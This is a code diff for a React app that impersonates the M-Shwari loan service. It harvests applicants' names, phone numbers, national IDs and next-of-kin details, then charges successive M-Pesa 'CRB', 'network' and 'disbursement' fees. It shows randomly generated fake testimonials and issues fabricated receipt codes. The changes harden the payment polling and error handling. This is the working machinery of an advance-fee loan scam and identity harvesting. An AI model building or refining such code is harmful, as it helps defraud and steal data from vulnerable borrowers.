@@ -1,60 +1,59 @@
 import React, { useState, useEffect, useRef } from 'react';
 
-const IMG_1 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGkAAABSCAYAAABXP/pUAAAD1klEQVR42u2dS0hUURjHf8YUrRoLoo1SCG7EmJ0Q1EaI6AEOaOQiNYkMAgmKVtXORSQtIiLoQVpBDxKcKIsWPXA2FS0kqYUQgS1y1UxBiyBoMVeSoXme5z3z/UEG0fvde+c3/+9857vnaBOP0oj81ip5CwSSSCAJJJFAEgkkgSQSSCKBFDclyvysVUP838CSJ/e6KXpdE7d7KgXpGbBL0znywFZg0SGg08CYxnj7gCeu053ONJgEdjsElAJOyZhUWec0pc961Bd9UARSBa135KZ2IC3VXW1usq1BoFMg1eamA+Ii/+dJJ8RF/kPqsuSmllBc5KrjMGLhHP2huMgVpG6g13BnYT8ByVXvbsBg7J4orQokDW/kHkOxDxOYXHbBjxga77oEkj6lDbgpOBe5hrRchelSb4gu8gHSALBdU6xjBCofnsyOaHJRt0Dy201HCVi+rHHoUzh2L7BTIJnXIQU3HSdw+QIpWaebdoTuIp8gLbspVeMxJ2kA+QQpCQzX8PspCu2luKk1zpBqdVNcXbQYd0jVjk0pzHbSGyLdfVU4Nk1hfUI5DTu8Pl3prcM1pBsUVq7Wo04K6xNKqV2x7L4MfLIEqLlMevtY7fhkCtJb4KkhNw0qxM0D94BfliDlqhif2lxB+gncVji+lJtagFGFuBPAgmdDzudKqc9k4TADZDS7aQi1JcMP8WeXR3HqK06T1qq7u4pu6ilykcrC+2kga2EM0p4mTUN6FY1P9WqIf/uK+hVddM1CFZczEdg0pKWo0lN10xbgjKKLZnybpFarhIV8+1zx+FFgo6KL7hhMbznTb6CNjsMXRRd0orZL74WhsajDBiBbkAAeOKyc7muu6PLAwf9UZLGHtIDePavVat7QWLTN5k3YbLC6cNMkdvt0sYf0QbELUU9ayhCAbD+quGrxXOOYawH9CRlS1tKnOw88Nhj/TciQsJTyJoA5Q7GTwJUVXYYgIU2h1iqq9hwmta5Ml6E5+mrTdbIEbnSeQkfahKaBWYfjfK7otVSnYqU2AGtLzb1cQcpGbjKxC+J6DAq2XIXvnac7UG+8llIGi3+YKeTCYVkvge8xLEoaCtICcEFjvHnMP9RrOEhEc5m8pliX8PPReOwhzUVzGh2T1wyByocVrFMa3DQeqot8gTSrwU2TBCxf1oKrTGzHCOBxRBwgZaNOQT26ReDyaVdFPUuuLuLfilTtSnh0Le+j1LW5hmNu0gDyCdIScBaR1+lOJJAEkkggNbZKFQ6vgW8KcX94ft/vFK5xte3Jc5P8M2BJdyKBJJBEAkkkkASSSCCJBFLc9BfQq5g38RAsSAAAAABJRU5ErkJggg==";
-const IMG_2 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFMAAABSCAYAAAAo7uilAAAF6ElEQVR42u2cXWgcVRTHf40RQ16yETQFu7YEt60hTUAhoWiitijEogYjJQWTl1ILikS08cUIgvGpibQgggEfbKS0Gi0tpkKFqmx8SP3AtCUaU2skFU2FdvehVemLD/dsHcfd2ZnZO1/r/cOFzXTnY39z7r3nnnNuV3GsFyM9qjEIDEwD08A0MjANTAPTyMAMQLVV8jvWATcCdUC9w/euAn8C14A/gBUDEzqBe4Dbgc1Ah49rnAIWpJ0D5oEz/xeYDwu4Z4BGDdfrKPISLgMHgCzwNbDk5YKrErA27wNe9Gl9lWoSOOoWbE3MLXEWmIoIJMCA3P8nYB9wb9JgNsmDT0cIsZiGpPsfkRcde5gZ4KA8eFzVKy/6iN1SdcBs1vSQ7dKttyRkQuwVS52Q3lQxzBRwXpNFTmiapcPWZl2WmXOA7EV7YzY+etE7Bee/JqDunfMAdQ/wWEJBnhXXqWLLPO/BclMOM/dAgpexh4DFsGfzUlBXgCeAEXnLSdN7lc7mKQ1Q05Zji8BrwOPAcIKgjlitMg7LyTSwbDu2RpzinT4npbzlmmmgIaBnX2+H6TXQ0SLRFV1aLgL1grhJR2Vicgv1E+At4CLwmxyrl5dzG9AG3AncrQHwqB2kV8tMObhCutRcZGJrcgF1FHjZw+KgU6z/fp9g2ygSrotr1Ki5hLfQBzxtWyWdBXrEov0sFh6QSbDDJdj9wHNJCXRY3a4W2/EPgK3y40/KsYs+QRYmvwngIeA+sfB8mXPeLvUPNS6tJCrNl4G6DfhR073mZKjYAOwu4VXsxyEaX66bhzFORjkBltNTwLNAq/zdBcz4hWmk9CpwB7DD6Uu1hpMrufIUqiVvbh/Xn5fxNFRVi2VesrlP45bV0LvAx8BXaM6TV+OYaZ2UMsCXJfzFPCpXPoWK6M8FaZlhz5S63afC2FbK8W4AHpSWRxUfnJCW1WmZSQVp1R5UxN5PYGQBOAZ8VInFJrmbW33gbQKiUuWBz1DFBzNex9gb2LEx6SDbgTeBWzVctw7YCGwHusXbuQBcqVbXyAoyA7xuWaHoVAcqpHeQEkUHSYdpBblGxsig8+xbBOhL1QTTbpFvEF5WswEVUdpXLTCtIPcSTXp4yAlo3GHaQ29dsqKJMs8+JIGPRMFM2XzfPpm141D5MSLPkxiYOcvnJqCff6eIo9aUDDmx9TNTqAJ+u64A7wNfiLWuFp+wLuLnzQOfxm0FlMJ7RH8TqgKtB1XeF4UuA3chJdq1MYGY83HuGWkTqK0rLdJ6CK/Gs1EWDEtxGDNzmq6zBBwHxlCJtjZUUmwyhN/QGcUElCpxvB14UvO9ChY7iCpj2Y2KZQahtWHBTJWxwgzwrVjQAVki6lYhN94pHoHuwrANaCrDtivtsRsPWj4PAKfdBhV86jCq2k4n0HpULVNFMNNFuu6yh/MzqJy0fUCfliVbJiCgi8ArGq/XWqqbt6AyfSlbK6blCieQQUqnGIaAH1BZxnUBAJ0NoLv/B+Y8qs4nZ2u6lXHpG44D3whUnZZ6TbPjHulychD3Ad1GgfohKqbYruH+6zUuTReAX6KC6dYqi41No8DnqN1hfRVY6y70VRT/iuSKamNulcXUIC+jV8a9c6gig+9QFcOLDud2CUidOzyWCh9qE2KVTtbaarlmAe7vwM/AX8BN4ljfEtAafj4qmJVapVu4YWo2igkoQ3TRnaA0iaVoIUyY2yOwmqB1yMnPDEpNwKNVaJXHo4C5giqsz1cRzPFyK6AgNQE8wj+7JJKsfooUeIXttGdRwdvhBFvpMCr6RNQwCxpD7buZTCDIMbeBjjA1J35nN5YN8DHv2mNOX4hD3jwr/mdXTC31pARGDpf7YpyKEGbEUlcDLxD9vvNTqG2FW8us968r7pXDm8Q/7Q/R4Z8UK5z2emKSyrAzqKRYN6r4QBfcPKqe/QSqBNvvptZE17Q3yVi21tKuAjc7nHMJlQD7HhVVOu22C7tRkjdVrUjLxuWBzH+Ta2AamAamkYFpYBqYRtf1N/xKM7CuoeLxAAAAAElFTkSuQmCC";
-const IMG_3 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAABSCAYAAAAIArdYAAABEklEQVR42u3cMU7DQBAF0B8rNDSIJl2uwFWgoEQcgAvkAKFKzyWgo+MeFPSUVKSBClEQSxGiIrNgxe9Lll2N5ml3La1teZL7s4wpXUYWYGBgYGBg4P/LdOt6XlDvuWGvJf314Lsk5wUFV0kWDbBXSW4K6jx0P4z0LjluNLqHRXUO3LSAh5EPIwy8X+DOGjalgYGBgYGBgYGBgYGB7Yd/n2lxY7MkFw3AJ0MFn24OUxoYGBgYGBgYGBh4z1K9eXhN4Zu+bwNzNETwbZJlvr7Xqvrua57kMsn1EMF9k9vninpv1jAwMDAwMDAwMDAwMDAwMDAw8FjB/UO8lySPBfWeGvX5XtTfeuLHJcDAwMDAwMB/lU/sBRrVByknOAAAAABJRU5ErkJggg==";
-const IMG_4 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABSCAYAAAD3oJK6AAAERUlEQVR42u2cT09UVxjGfxJXLjo7SZoxMbFTbTqClJDBUBzbStE0IaYbu+nX6HfowqVLV667kDZaasCoKBEkSjX+w65KmplFQ+gn6IJ7E5zcezn3fd9zDibn2QCTe8+89zf3ec6fe5hDzF8mqVxDCUEClAAlQAlQApQAJUAJUFKRDu/5/ZhRm397rvlYyBpzQD8DPxldwJ/Ad8CWMZjTWdtB6xsChoF7hhcyAox6uHNmY9SXZ9A6sGp4MWc8AGrGqC8H1Af+MCzga2M4w8A3hu3NSXqxFcMCjgItw/ZaQNuwvZOu9e0FZGmzNvCp4QVNGt+RDdf69gKytpllDjWx1yXJQPHxAcyh48b5k6srAbRmaLNxoxxqGufP3gFnqy4gS5s1gM4BzJ9a9RXNxSx7M4uLG/E4bZmUALLszboG9hrzCKgrAWRpMyef73P3tD0Cau9XX9lyx0pIn1fobIAVjY4EkKXNNDl0OgCgbyWA+sB85BxqAScCAJqTAALYMPT5qBBQOwCgRlV9VYB+A7aNipBYJUT+5JqSAAK4FsLnEfNn35zcD9DjED4v0BfA+YCA5qSArGzWqJlDH2fnhFJpfS6Pfa769nmBLhBeU1JATyOMh44L32PLuj4XQLeMbOaaQ6OK/LmuqO9HKSCr3qwBTDsc94kwf1aBX5QzgGkpoIWA46GvhG2vAM+V88gJKaBlI5tddjjmM2HbL7OfDxT1XZQCsrLZjEP+jCvuIIB3wI5VfXUAWdmsKodOCfNnKbMXQC9bjTCprw6gZaMlkAkhvCo9GliJeK6o75wUENisNF70kD+DUyJNDnU1gCxsNuMhf94M/K3NoWEpICubFVmpI8yfm8DmwGsbwF1FfeNSQFY2K8qhL4VtLZe8/kRR31hsQEU5dFLYVlnePLPIIQmgtwY2e8/nmeWkgP6pqPOFor6mFJDVc7Pxgd5Lkj83KN+QuZmFtVQdKSArm415zJ9cDxX1zWoAWdisWwJLMr1wHR/V0VlgWArIwma5z6eR7X3edhgx9xQ51AY+0uy0t7BZB/hcmD8uk+dNBSCAEQ2gt9kkUaNTwPfCc127cc2AcVYDqG8A6AeHJZAyue661+TQJe0/s9xXni99tLxUML0o078KmzW1gCxsJtHtGsduAYvSN9IC6kcC9NJ4OOANkIXNJKq7IPY6JqDQNquaXlSNh5ZiAerXzAStloU1/hULkLYrraMdQf7kWogJKJTN3gjvoDrjJi+AQtlMM735j93l2SiAAO4EAPRM+SGuxQTU82yznczKGj2NCcj3oHEd3QPBvI1ogGB3y95BmF5UfYg3YwLqSYLQUa+M2rkfE5AoCB20jd3G9tWYgHzZbAG7b3LYpMZjaR+Aeh66/LvGd/l8TEB94PcDmj+1x1OHPQXqr8AV4IhBW+/QbWcp0iKOq4yH0hdNhrdYApQAJSVACVAClAAlQB+C/gez/dGf8FRqvAAAAABJRU5ErkJggg==";
-const IMG_5 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABSCAYAAADU+8NvAAAFFklEQVR42u2dQWhcVRjHf33swdvixZWSQi5JLa5sqbihkKBtScQS3eKmSQoNVooUWsST9FI81Yu3HDx48GIK2lIhVGtJhChNNTTaQzUn46FgLj1JLp497FtYlmz2zcx3zjy28z8lm/dm/9523n++9363d3OcOUOUfyURQQQdQUdF0BF0BB0VQUfQURF0UVUyPP6QqN9/RO0U7XokoMeBdVG/nwFXHdv4GpgXXc814NOiWEdd2O99x/PHhZARt+UM+qiozy3grmMbM2IOVaBZBNDDwIKoz2XH80eAjzywuFQE0FVhn6uO5896YjEJTIQGXRP1t+k4oVaAdzwOvLnQoA8XZDS/IZ6Uu3U+/TCDgFb6syvoc56DgzLQCAW6WhDbGPcFoUsXQ4GuFWQ0z5CP6j4mxSygXxP0s+sIegQ4lWNq4oO8QR8T3a6PHG2jIQ4x+2kBGMoT9EFRP2uOId1Z8tdsnqDHRLbhktvwHdL10id5gn6lALZxjjAqA6fzAK3yZxfbmEhHdCjN5wH6oMg2vndcEpcDgl5IIx6voBX+/DPw2CGke53wmvUNWuHPvwUO6XYE7+Fjn6CPCbzR1TZcQ7pNNOWpMoKiQLLPbVsOaBtNQUi3SquSsynyai+gjwe2DUW2cIVWdfuOoK0GjjmfXqCHA9rGhCCsXAMepD/fR6MratA1gT+72IaiynGz4+d13OuU7eijogT9ksCff7A8b4hWlcNVG12/3xNNig0l6OMC23josBJz/ZAXgT+7XnuYXperZmxHdTfoiiB+drGN9zyMZtLrUYzqSWBUAfpF4NVAttFEk3P+tcfrt0WTYlMBWuHPtrahCOmu03vD4h+0dkm56oJN/iMR+/OSpW3U0GQKV/b527Yo+igDb7uAVvjzA8vzFDW6tQz9r4rsY850UuwEPSrwZxvbqIhCupsZjvkLt/x4W3VTVp2gjzj6s61tNNDknH/KcMxTUfRhPKd0gh4PZBsfCt70curBWfSjCPRbJvmPpOP2PZzDiOrWaVFId8Pg2MfCSXHaFPSoI+glgxHVvRJ01b8Wd5PKPubJuP8jEfmzjW3URLHz56n3mt59iiV5lYwlv0Tkzza2odpLt2JxzjZwS9R/poip/a2svG2jIpoEd2kVcG2qMc+JQJ+hlUNf7wd6AreykY1tTIpCunK67A6tZj/QCfByANu4ymDpVL/8RwK869DBooVtqEK6IqkKnOgH+ohDBxuBQroiaq4faJd9wL8YHj+C7vswRdNJ9tkUmTjahulOoFkGW1M+QJvaxtAA20ZbF3rlP1xAm6ZExwZwEtwr3JxUgl4EnhguUC7xbOgsexQFbEGb7uAf6fVJD6Dqe6U0bEGbrgZneLZ0XgF6EbNsWQ0/j30osk7Q9aXQkkUjprYxLXwDW54BHUKXg5nqZFXybBvKkO468IVn0EeB70RtXQG+bAcNJc+2oQrpdmntNNrxDHonvWsU1/w8rUr5ExuPNrGNinC5fQ/7/Xym+kbY1mXbyfCRYUineuzDbfLTLWFbJ9uhXmJoGyaLFFVIt4X9fj4bbaPbkgDwpiloE9uopet+hTZy8OZuLQvbugYMZwVtWtKfRveN16UAcfC34vamsoL+yiDaGEL3JK81Wvvl8tZT8Qd8MStoE88aQ/fYh7uY79lQaVXYVr2UYbX1N/C7ofkrVnD/iSMAU90A3gdeUDR2IP7Dm3wUH9QdQUfQURF0BB1BRwQRdAQdZa7/AePN2EfxrarfAAAAAElFTkSuQmCC";
-const IMG_6 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAABSCAYAAAAIArdYAAADAElEQVR42u2cP2gTcRTHPy11KZgYHARrcBJEUqoO4uJSqKBQI3SUqpMOUjIognAu/gFjaVEkiyCKijhE0GIr4qYBQYe26iKCWFsRHKx1cOnicD8xhDSXS97lfr/7/b7LXcnlcZ+83Pu9936v6WLqMDapG8vkgB2wA3bADtgBO+D41FN1no35XhY7CbwPeBkj7DIwC3wDFoDvwFfgI/ApCuD1MXs3Aww2+DBKwGtgxoZnOAN4wDTwEzgD9NsStDLAOPAOuAhssSlKe8AzYMSmZSkHlJW3rVqHPeCabYlHoRnopGVahaCvdxJTSw84aFsuXbQNOAecsK1aGguqliS1EuLadIReHgEeRQ08HAI4pY47VfEwKHwv+U4AzwFLId8zDVxW0bWovCOhQ7o/wzPAAeCNkL00MKB70FpaK8K2qH4TovQ8cEnIVsqUZem5kJ0dpgAv2ObhRfx+lqh0z7RmbQPeZRNwFr9p165+mwK8VcjOZ1OA9wrZ+WEC8Db8/rP48qYr8HlBW690Bh4A7gKjQvZedKIBkAFW1fk6dVxV57VHgI1AH7AfOC7cECh3AvgB8Kfq796a12tfy0bU9Vihzm5jFMA5TR6PqXqNiCQ38SZMTC1bVUnV1FYAfwCumFo8tBKoztGgiZg04AvAU5PLwzDygMmgi3oSAnsSuNnMhaYDL+M32ytJaAAE6R6wOwys6cAp4EvYN5kMnMcfUrMGGOAYNXtHcQStYeBXwDUbgPsCVVIOOA0cjRN4jua2S2+otbNdjQJPqNkH1vErXSbcpEAjnaXJucs4geeBO0K29qjkQ/ugdVvQy2P4g+5aA0t6Oa0CmPbLkqSX8wRMD+gALOllgKv4jXytE49bgrbSwCndgd8D1wXtFVhjwFSn1LIsbK+oO3BF2Ms56sxO61Y8SHvZQ/PBtArwUNjmuO7lYUnY3hBV/+rTTYNx+Ri9/DiCZW/Tv/JwO/AWf6Czt03DffzfKm1HE8Bmgfup1hFgssv9cIkDdsAO2AE7YAfsgDulv/Fpd7yOAQjYAAAAAElFTkSuQmCC";
-const IMG_7 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAABSCAYAAABKQcTPAAAAeklEQVR42u3ZsQmAQAxG4ae4his4i4Jr2oijuIHgAgdiaXuVV9x5WLy/SpUPknRpWEdqpKVShISE8tNFdV+o55GCNmAoAM3A8ja6+4MpeXVCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQnHiP8IJ7Jn9LiCkoMkdCQn9G3oAuBIJga6yH/kAAAAASUVORK5CYII=";
-const IMG_R = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFwAAABSCAYAAADZ5bMoAAADbElEQVR42u2bvWtTURjGfylNO6gVFFxKNnF0EuyQOtlRsOA/oNBOVdCpLuLHoFODKIIKBnQRBVtQHGyXtg4uFewm1cmKIDqIdgi3pQ55L9zGmt7v3NM8D4RLPji5/O5zn3PekzelL+UDSPmpRwgEXMAlARdwScAFXBJwAVdwScAFXBJwAVcEnMAF3DmtAi+AqoBnrwlgEBgFFosKvrSLfmL7A/QFnpftOAfcA6bl8PQ0Bexpec2zx0lz+6y5Xw5PqKpFiLfD53zHLwK1Tjl+NwBfAIZDAN8O/DPgriIl2kQZBXYwaoaBO8AHG0cOD6HNiLDbOf4rcCtrx7vs8NmUxvEdf8gc/wOYFPCtmrTVh5fyuB4wANy0u+e6IgVGgDcZwG4XNzeAK90KfNVu/zzlg68Bl7opUmatfM9bfs5ftKh51A3ApzLK7Tjgzxr4yPs1rgCfMHd5BTkfH7y/UbYQFrwLGT5qTvIKfI7B6vVEJxx+O6VxhoAnBYdNlPPLAvg4cCEF6FXgFf/uAhbV4T93cncWwKvAfaBh0McTjPXUihAPNzTWiQxfASqB5/1AKeZae9AR2GXgMs19mFwjZb4FNub0lYh3iF/YuAK7FhZ2msCft8mvil2MMCX7TIcKm7iw61Erz56UYJ8xN/9Px3dw+qjtjww45Ow6cC7vSjMM7KDTN7eZSCdtnY1Dzq7FgZ100owCm5aJdAZ4DJyyMtkVVxNlgkwT+LxldiPm9/bHLRw6vM4eI+GPz70x1tl1i4e4sNeBjYBjXHD2nE3qiRUlw8/bXkElwfet02zWKTsC2l9jj6Q1aFiHTwOnE7q6xNbOqKJn9RxwDXib5uBhgG8a6EaXgF4GrpJRo1AY4HFWIWuOgn5Ixm0SvSmOtW7HDQdAB+eQXFvfkgD3nYwjbg5CXgMe0Gx1e5fnSfRGBOvD9dfOfY4A9lUHXtLB1uUwwJeBo23e9woK14+L18AS6XVqJVKUSnMIOAbsBY4Ah2k2REaRZ3C8lIC2GmMJeA98LArgNPdSghqxCzEYuCAVi6P99vrBBOOvAZ+BX8Anmnvm32k2YH7LO4eLADyqhuy4b5v3ftvRGYguAO9a6X+aAi7gkoALuCTgAi4JuIALuCTgAi4JuIBLAi7gAi4JuIBLAi7gkoALuIBLAi7gUlT9BSWwuZFFI5P8AAAAAElFTkSuQmCC";
-
-const COUNTIES = ["Nairobi","Mombasa","Kisumu","Nakuru","Eldoret","Meru","Nyeri","Kisii","Bomet","Kakamega","Machakos","Kilifi","Garissa","Kitui","Embu","Murang'a","Kiambu","Nyandarua","Laikipia","Turkana","Marsabit","Isiolo","Tharaka Nithi","Kirinyaga","Kajiado","Narok","Taita Taveta","Kwale","Tana River","Lamu","Mandera","Wajir","Vihiga","Bungoma","Busia","Nyamira"];
+// ============================================================
+// KEEP YOUR EXISTING CONSTANTS — do not delete these:
+//   const IMG_1 = "data:image/png;base64,iVBORw0KGgoAAAAN...";  (keep original)
+//   const IMG_2 = "data:image/png;base64,iVBORw0KGgoAAAAN...";  (keep original)
+//   const IMG_3, IMG_4, IMG_5, IMG_6, IMG_7, IMG_R           (keep originals)
+//   const COUNTIES = [ ... ];                                (keep original)
+// ============================================================
 
 export default function App() {
   const [view, setView] = useState('splash');
   const [processing, setProcessing] = useState(false);
   const [splashDone, setSplashDone] = useState(false);
-  
+
   const [formData, setFormData] = useState({
-    fullName: '', phone: '', id: '', age: '', occupation: '', county: '', email: '', nextKinName: '', nextKinPhone: '', hearAbout: 'Friend/Family', purpose: ''
+    fullName: '', phone: '', id: '', age: '', occupation: '', county: '', email: '',
+    nextKinName: '', nextKinPhone: '', hearAbout: 'Friend/Family', purpose: ''
   });
   const [errors, setErrors] = useState({});
   const [selectedNetwork, setSelectedNetwork] = useState('safaricom');
   const [selectedDisbPhone, setSelectedDisbPhone] = useState('');
-  
+
   const [showHearAboutSheet, setShowHearAboutSheet] = useState(false);
   const [showCrbModal, setShowCrbModal] = useState(false);
   const [crbPhone, setCrbPhone] = useState('');
   const [crbStatus, setCrbStatus] = useState({ type: '', msg: '' });
-  
+
   const [showStkOverlay, setShowStkOverlay] = useState(false);
   const [stkPhoneDisplay, setStkPhoneDisplay] = useState('');
   const [stkStatusText, setStkStatusText] = useState('Waiting for callback...');
-  
+
   const [showNetFeeConfirmed, setShowNetFeeConfirmed] = useState(false);
   const [netFeeReceipt, setNetFeeReceipt] = useState('');
-  
+
   const [showAllFeesCleared, setShowAllFeesCleared] = useState(false);
   const [disburseReceipt, setDisburseReceipt] = useState('');
   const [toastMsg, setToastMsg] = useState('');
   const [checkProgress, setCheckProgress] = useState(0);
-  
+
   const [feedItems, setFeedItems] = useState([
     { name:'James M.', initials:'JM', color:'#00b050', text:'Nimepata STK nikalipa 280 na 15k ishaingia kwa Mpesa! Shukran M-Shwari.', time:'1 minute ago' },
     { name:'Mercy W.', initials:'MW', color:'#008a3e', text:'Nimepokea saa hii. Asante sana M-Shwari!', time:'45 seconds ago' },
     { name:'Samuel K.', initials:'SK', color:'#00b050', text:'Fast and reliable. 15,000 imeingia chap chap.', time:'2 seconds ago' }
   ]);
-  
-  const feedIntervalRef = useRef(null);
 
-  // Splash Timer
+  const feedIntervalRef = useRef(null);
+  const pollIntervalRef = useRef(null); // NEW: tracks active polling interval
+
+  // Splash timer — was 4600ms, now 3800ms (faster handoff after animation)
   useEffect(() => {
     if (view === 'splash') {
       const timer = setTimeout(() => {
         setSplashDone(true);
         setView('step1');
-      }, 4600);
+      }, 3800);
       return () => clearTimeout(timer);
     }
   }, [view]);
@@ -64,10 +63,14 @@ export default function App() {
     if (view === 'step3' || view === 'crbPage') {
       if (!feedIntervalRef.current) {
         feedIntervalRef.current = setInterval(() => {
-          const names = [{ name:'Peter O.', initials:'PO', color:'#00b050' }, { name:'Faith A.', initials:'FA', color:'#008a3e' }, { name:'Kevin O.', initials:'KO', color:'#00b050' }];
+          const names = [
+            { name:'Peter O.', initials:'PO', color:'#00b050' },
+            { name:'Faith A.', initials:'FA', color:'#008a3e' },
+            { name:'Kevin O.', initials:'KO', color:'#00b050' }
+          ];
           const texts = ['Nani mwingine amepata? Yangu imekubali.', 'Niko Kisumu na nimepata. M-Pesa confirmed!', 'Hii kitu ni legit, 15k imefika.', 'Asante sana M-Shwari!'];
           const times = ['Just now','5 seconds ago','10 seconds ago'];
-          
+
           setFeedItems(prev => [{
             ...names[Math.floor(Math.random()*names.length)],
             text: texts[Math.floor(Math.random()*texts.length)],
@@ -76,14 +79,24 @@ export default function App() {
         }, 8000);
       }
     }
-    return () => { if (feedIntervalRef.current) clearInterval(feedIntervalRef.current); };
+    return () => { if (feedIntervalRef.current) { clearInterval(feedIntervalRef.current); feedIntervalRef.current = null; } };
   }, [view]);
+
+  // NEW: clean up STK polling interval on unmount
+  useEffect(() => {
+    return () => {
+      if (pollIntervalRef.current) {
+        clearInterval(pollIntervalRef.current);
+        pollIntervalRef.current = null;
+      }
+    };
+  }, []);
 
   const validateName = (val) => /^[a-zA-Z\s.]+$/.test(val) && val.length >= 3;
   const validatePhone = (val) => /^(07|01)\d{8}$/.test(val);
   const validateId = (val) => /^\d{6,8}$/.test(val);
   const validateAge = (val) => { const a = parseInt(val); return !isNaN(a) && a >= 18 && a <= 99; };
-  
+
   const handleInputChange = (e) => {
     const { id, value } = e.target;
     let val = value;
@@ -97,8 +110,12 @@ export default function App() {
   const handleSubmitApplication = (e) => {
     e.preventDefault();
     const newErrors = {
-      fullName: !validateName(formData.fullName), phone: !validatePhone(formData.phone), id: !validateId(formData.id),
-      age: !validateAge(formData.age), occupation: formData.occupation.trim().length < 2, county: formData.county === ''
+      fullName: !validateName(formData.fullName),
+      phone: !validatePhone(formData.phone),
+      id: !validateId(formData.id),
+      age: !validateAge(formData.age),
+      occupation: formData.occupation.trim().length < 2,
+      county: formData.county === ''
     };
     setErrors(newErrors);
     if (Object.values(newErrors).some(err => err)) return showToast('Please correct the highlighted fields.');
@@ -124,59 +141,78 @@ export default function App() {
 
   const showToast = (msg) => { setToastMsg(msg); setTimeout(() => setToastMsg(''), 3000); };
 
-  // --- API Logic ---
   const normalizePhone = (raw) => {
-    let p = raw.replace(/\D/g,'');
-    if(p.startsWith('0')) p = p.slice(1);
-    if(p.startsWith('7')||p.startsWith('1')) p = '254'+p;
-    else if(!p.startsWith('254')) p = '254'+p;
+    let p = String(raw).replace(/\D/g, '');
+    if (p.startsWith('0')) p = p.slice(1);
+    if (p.startsWith('7') || p.startsWith('1')) p = '254' + p;
+    else if (!p.startsWith('254')) p = '254' + p;
     return p;
   };
 
+  // UPDATED: wrap fetch + json parse; forward real error messages
   const sendPaylorSTK = async (phone, amount, reference, description) => {
     const payload = { phone: normalizePhone(phone), amount: Number(amount), reference, description };
-    const res = await fetch('/api/pay', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-    const data = await res.json();
-    if (!res.ok) throw new Error(data.error || 'STK push failed');
+    let res;
+    try {
+      res = await fetch('/api/pay', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch {
+      throw new Error('Network error. Check your connection and try again.');
+    }
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || `Payment failed (${res.status})`);
     return data;
   };
 
+  // UPDATED: wrap fetch + json parse
   const queryTxn = async (id) => {
-    const res = await fetch(`/api/pay?transactionId=${encodeURIComponent(id)}`);
-    const data = await res.json();
-    if (!res.ok) throw new Error(data.error || 'Query failed');
+    let res;
+    try {
+      res = await fetch(`/api/pay?transactionId=${encodeURIComponent(id)}`);
+    } catch {
+      throw new Error('Network error while querying payment.');
+    }
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || `Query failed (${res.status})`);
     return data;
   };
 
-  // New Time-lapse Polling Logic (30 attempts = 90 seconds)
+  // UPDATED: use pollIntervalRef so it cleans up on unmount
   const pollTxn = (txId, onSuccess, onFail) => {
-    let attempts = 0; 
-    const max = 30; 
+    if (pollIntervalRef.current) { clearInterval(pollIntervalRef.current); pollIntervalRef.current = null; }
+    let attempts = 0;
+    const max = 30;
     setStkStatusText('Waiting for you to enter PIN...');
-    
-    const p = setInterval(async () => {
+
+    pollIntervalRef.current = setInterval(async () => {
       attempts++;
-      if (attempts > max) { 
-        clearInterval(p); 
-        return onFail('Timed out. Check M-PESA and try again.'); 
+      if (attempts > max) {
+        clearInterval(pollIntervalRef.current);
+        pollIntervalRef.current = null;
+        return onFail('Timed out. Check M-PESA and try again.');
       }
-      
+
       try {
         const t = await queryTxn(txId);
         const s = t.status || t.state;
-        
-        if (s === 'COMPLETED' || s === 'SUCCESS') { 
-          clearInterval(p); 
+
+        if (s === 'COMPLETED' || s === 'SUCCESS') {
+          clearInterval(pollIntervalRef.current);
+          pollIntervalRef.current = null;
           setStkStatusText('Confirmed!');
-          onSuccess(t); 
-        } else if (s === 'FAILED' || s === 'CANCELLED') { 
-          clearInterval(p); 
-          onFail('Payment failed or cancelled.'); 
+          onSuccess(t);
+        } else if (s === 'FAILED' || s === 'CANCELLED') {
+          clearInterval(pollIntervalRef.current);
+          pollIntervalRef.current = null;
+          onFail('Payment failed or cancelled.');
         } else {
           setStkStatusText(`Waiting for confirmation... (${attempts}/${max})`);
         }
-      } catch(e) { 
-        console.warn('poll error', e); 
+      } catch (e) {
+        console.warn('poll error', e);
       }
     }, 3000);
   };
@@ -184,14 +220,14 @@ export default function App() {
   const processCRBPayment = async () => {
     if (!crbPhone) return setCrbStatus({ type: 'error', msg: 'Enter M-Pesa number.' });
     setCrbStatus({ type: 'pending', msg: 'Sending STK push...' });
-    setStkPhoneDisplay(`(${crbPhone})`);
+    setStkPhoneDisplay(`(+254 ${crbPhone})`);
     setShowStkOverlay(true);
 
     try {
       const r = await sendPaylorSTK(crbPhone, 280, `CRB_${Date.now()}`, 'M-Shwari CRB Fee');
       const txId = r.transactionId || r.id;
-      if (!txId) throw new Error('No transaction ID');
-      
+      if (!txId) throw new Error('No transaction ID returned');
+
       pollTxn(txId, () => {
         setShowStkOverlay(false);
         setShowCrbModal(false);
@@ -214,8 +250,8 @@ export default function App() {
     try {
       const r = await sendPaylorSTK(selectedDisbPhone, 328, `NET_${Date.now()}`, 'M-Shwari Network Fee');
       const txId = r.transactionId || r.id;
-      if (!txId) throw new Error('No transaction ID');
-      
+      if (!txId) throw new Error('No transaction ID returned');
+
       pollTxn(txId, (t) => {
         setShowStkOverlay(false);
         setNetFeeReceipt(t.providerRef || t.reference || `UG${Math.random().toString(36).substring(2,11).toUpperCase()}`);
@@ -232,8 +268,8 @@ export default function App() {
     try {
       const r = await sendPaylorSTK(selectedDisbPhone, 700, `DISB_${Date.now()}`, 'M-Shwari Disbursement Fee');
       const txId = r.transactionId || r.id;
-      if (!txId) throw new Error('No transaction ID');
-      
+      if (!txId) throw new Error('No transaction ID returned');
+
       pollTxn(txId, (t) => {
         setShowStkOverlay(false);
         setDisburseReceipt(t.providerRef || t.reference || `UG${Math.random().toString(36).substring(2,11).toUpperCase()}`);
@@ -246,8 +282,12 @@ export default function App() {
 
   return (
     <>
-      {/* SPLASH */}
